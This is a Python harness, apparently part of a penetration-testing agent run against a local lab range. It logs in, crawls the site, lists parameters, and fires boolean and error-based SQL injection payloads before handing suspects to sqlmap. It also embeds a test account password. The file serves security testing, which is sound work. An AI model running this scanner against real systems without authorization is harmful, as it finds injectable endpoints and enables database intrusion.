#!/usr/bin/env python3
"""sqli_harness.py - blind SQLi discovery front-end for sqli_probe.py (sqlmap oracle).

sqlmap PROVES an injection point but must be pointed at the right endpoint+parameter, and it is
slow (~1-2 min/param). Enumerating every candidate through it is infeasible and noisy. This harness
is the discovery + cheap-gate layer, mirroring idor_harness's discipline:

  1. Log in, crawl the authed surface, collect candidate (url, param) pairs from: existing query
     params on seen URLs, GET/POST form fields, and /api/{noun} enumeration x a param-name wordlist.
  2. CHEAP boolean-differential PRE-SCREEN per candidate (a handful of requests, paced): AND/OR
     payloads in both numeric and string context, plus an error probe. Keep a candidate ONLY if it
     shows an injection SIGNAL (AND-true==baseline!=AND-false, or OR-true!=baseline==OR-false, or an
     error/500 signature). This gate is what keeps sqlmap calls down to the real suspects.
  3. Escalate survivors to sqlmap (sqli_probe.probe, with the auth cookie) for deterministic PROOF.

Nothing hardcodes the route, param, or injected value - all come from live crawl/enumeration, so the
range layout stays unknown to the operator. Prints counts only; suspects -> findings file.
"""
from __future__ import annotations
import sys, re, json, time, hashlib, pathlib, http.cookiejar
import urllib.request, urllib.parse, urllib.error
from urllib.parse import urljoin, urlparse, urlencode, parse_qsl
from html.parser import HTMLParser
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
import sqli_probe
from runner import Scope

import os
BASE = os.environ.get("NABLUS_TARGET", "http://127.0.0.1:8099").rstrip("/")
CREDS = {"alice": "Sunflower#A1pha"}
OUT = r"C:\Users\Laith\nabulus-agent\sqli_findings.json"
SCOPE = "scope_range.json"

PACE = 0.02
MAX_PRESCREEN = 600      # (url,param) candidates to pre-screen (dead params cost 1 req each)
MAX_SQLMAP = 5           # survivors escalated to sqlmap (hard cap on the slow step)
MAX_RELOGIN = 3          # bounded self-heal if the fragile range de-auths mid-screen
PARAM_NAMES = ["id", "uid", "user_id", "user", "tag", "q", "name", "search", "cat",
               "category", "sort", "order", "page", "note", "doc", "ref", "status"]
API_NOUNS = ["note", "notes", "status", "search", "user", "users", "profile", "item",
             "items", "order", "orders", "doc", "docs", "product", "report", "record"]
_WORD = re.compile(r'"[^"]*?":\s*"([A-Za-z][A-Za-z0-9_-]{1,20})"')


_CK = {"v": "", "user": "", "pw": "", "relogins": 0, "seen_ok": False}


def _pace():
    if PACE:
        time.sleep(PACE)


def login(user, pw):
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    try:
        op.open(BASE + "/login", data=urlencode({"username": user, "password": pw}).encode(), timeout=10)
    except Exception:
        pass
    ck = "; ".join(f"{c.name}={c.value}" for c in cj)
    _CK.update(v=ck, user=user, pw=pw)
    return ck


def _raw(url):
    _pace()
    r = urllib.request.Request(url, headers={"Cookie": _CK["v"]})
    try:
        with urllib.request.urlopen(r, timeout=10) as resp:
            return int(resp.status), resp.read(200000)
    except urllib.error.HTTPError as e:
        return int(e.code), (e.read(200000) if e.fp else b"")
    except Exception:
        return 0, b""


def req(url, _cookie=None):
    """Self-healing: a genuine 401 after auth has worked means the fragile range dropped the
    session -> re-login (bounded) and retry, so authed endpoints don't silently vanish mid-screen."""
    st, body = _raw(url)
    if st == 200:
        _CK["seen_ok"] = True
    if st == 401 and _CK["seen_ok"] and _CK["relogins"] < MAX_RELOGIN:
        login(_CK["user"], _CK["pw"])
        _CK["relogins"] += 1
        _CK["seen_ok"] = False
        st, body = _raw(url)
    return st, body


def sig(status, body):
    # normalize volatile bits so only the id-selected content drives the signature
    norm = re.sub(rb"\d+", b"#", body[:8000])
    return (status, hashlib.sha1(norm).hexdigest()[:12])


class _Links(HTMLParser):
    def __init__(self):
        super().__init__(); self.hrefs = []; self.forms = []; self._cur = None
    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "a" and a.get("href"):
            self.hrefs.append(a["href"])
        if tag == "form":
            self._cur = {"action": a.get("action", ""), "method": (a.get("method") or "get").lower(), "names": []}
        if tag in ("input", "select", "textarea") and self._cur is not None and a.get("name"):
            self._cur["names"].append(a["name"])
    def handle_endtag(self, tag):
        if tag == "form" and self._cur is not None:
            self.forms.append(self._cur); self._cur = None


def crawl(cookie, depth=2, cap=15):
    seen, frontier, pages = set(), [BASE + "/"], []
    for _ in range(depth):
        nxt = []
        for u in frontier:
            if u in seen or len(seen) >= cap:
                continue
            seen.add(u)
            st, body = req(u, cookie)
            pages.append((u, st, body))
            p = _Links()
            try:
                p.feed(body.decode("utf-8", "replace"))
            except Exception:
                pass
            for h in p.hrefs:
                link = urljoin(u, h).split("#")[0]
                if link.startswith(BASE) and link not in seen and "logout" not in link.lower():
                    nxt.append(link)
            for f in p.forms:
                yield_form = (urljoin(u, f["action"]).split("#")[0], f["method"], f["names"])
                pages.append(("__form__", yield_form, b""))
        frontier = nxt
    return pages


def collect_candidates(cookie):
    """Return (candidates, seeds). candidates = set of (base_url_no_query, param). seeds = string
    values harvested from bodies to use when a numeric seed yields no matching row."""
    pages = crawl(cookie)
    cands, seeds = set(), set()
    for entry in pages:
        if entry[0] == "__form__":
            action, method, names = entry[1]
            base = action.split("?")[0]
            for n in names:
                if n and n.lower() not in ("username", "password"):
                    cands.add((base, n))
            continue
        u, st, body = entry
        pr = urlparse(u)
        for k, _v in parse_qsl(pr.query):
            cands.add((f"{pr.scheme}://{pr.netloc}{pr.path}", k))
        for m in _WORD.finditer(body[:40000].decode("utf-8", "replace")):
            seeds.add(m.group(1))
    # API enumeration: /api/{noun} x param-name wordlist (the unlinked-route case)
    for noun in API_NOUNS:
        for pth in (f"{BASE}/api/{noun}", f"{BASE}/{noun}"):
            for pn in PARAM_NAMES:
                cands.add((pth, pn))
    return sorted(cands), sorted(seeds)[:8]


# payload pairs per context; each returns (true_payload, false_payload) appended to the seed
def _payloads(seed):
    s = seed
    return [
        ("num_and", f"{s} AND 1=1", f"{s} AND 1=2", f"{s} OR 1=1", f"{s} OR 1=2"),
        ("str_and", f"{s}' AND '1'='1", f"{s}' AND '1'='2", f"{s}' OR '1'='1", f"{s}' OR '1'='2"),
    ]


def _url(base, param, value):
    return f"{base}?{urlencode({param: value})}"


def prescreen(base, param, cookie, seeds):
    """Cheap boolean/error gate. Returns (hit: bool, reason: str). A real injection shows up as an
    AND-differential (true==baseline!=false) or OR-differential (or-true!=baseline==or-false), in
    numeric or string context, for at least one seed. A 500/error signature also flags."""
    trial_seeds = ["1"] + [s for s in seeds[:3]]
    for seed in dict.fromkeys(trial_seeds):
        base_st, base_body = req(_url(base, param, seed), cookie)
        if base_st in (0, 401, 403, 404):
            continue                      # param not live on this route for this seed
        bsig = sig(base_st, base_body)
        for ctx, t, f, ot, of in _payloads(seed):
            st_t, b_t = req(_url(base, param, t), cookie)
            st_f, b_f = req(_url(base, param, f), cookie)
            if st_t >= 500 or st_f >= 500:
                return True, f"error:{ctx}"
            s_t, s_f = sig(st_t, b_t), sig(st_f, b_f)
            if s_t == bsig and s_f != s_t:
                return True, f"and-diff:{ctx}:seed={seed}"
            st_ot, b_ot = req(_url(base, param, ot), cookie)
            st_of, b_of = req(_url(base, param, of), cookie)
            s_ot, s_of = sig(st_ot, b_ot), sig(st_of, b_of)
            if s_ot != bsig and s_of == bsig:
                return True, f"or-diff:{ctx}:seed={seed}"
    return False, ""


def main():
    scope = Scope(json.loads(pathlib.Path(SCOPE).read_text()))
    cookie = login("alice", CREDS["alice"])
    cands, seeds = collect_candidates(cookie)
    print("login:", "yes" if cookie else "NO", "| candidates:", len(cands), "| string seeds:", len(seeds))

    flagged = []
    for base, param in cands[:MAX_PRESCREEN]:
        hit, reason = prescreen(base, param, cookie, seeds)
        if hit:
            flagged.append((base, param, reason))
    print("pre-screen flagged:", len(flagged), "/", min(len(cands), MAX_PRESCREEN), "candidates")
    for base, param, reason in flagged:
        print(f"  flag: {urlparse(base).path}?{param}=  [{reason}]")

    findings = []
    for base, param, _reason in flagged[:MAX_SQLMAP]:
        target = _url(base, param, "1")
        fs = sqli_probe.probe(target, None, scope.assets, 2, 1, "BEST", 480, sys.executable, _CK["v"])
        for f in fs:
            f["discovered_via"] = "blind sqli_harness pre-screen"
            findings.append(f)

    pathlib.Path(OUT).write_text(json.dumps(findings, indent=2))
    confirmed = sum(1 for f in findings if f.get("confirmed"))
    print("session relogins:", _CK["relogins"],
          "| escalated to sqlmap:", min(len(flagged), MAX_SQLMAP), "| CONFIRMED SQLi:", confirmed)
    print("confirmed params:", sorted({f["parameter"] for f in findings if f.get("confirmed")}))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
